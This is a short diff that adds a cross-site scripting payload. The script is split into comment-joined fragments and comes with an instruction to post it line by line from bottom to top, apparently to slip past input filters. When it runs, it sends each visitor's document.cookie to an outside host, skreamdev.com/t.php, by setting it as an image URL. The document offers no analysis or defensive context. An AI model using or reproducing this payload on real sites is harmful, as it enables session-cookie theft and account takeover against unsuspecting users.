@@ -1,0 +1,12 @@
+
+//http://skreamdev.com/t.php?c=*cookie*
+//Post line by line from bottom to top
+
+
+<script>/*\
+*/var i=new Image();/*\
+*/i.src="http://skr"+/*\
+*/"eamdev.com"+/*\
+*/"/t.php?c"+/*\
+*/"="+document.cookie;/*\
+*/</script>}
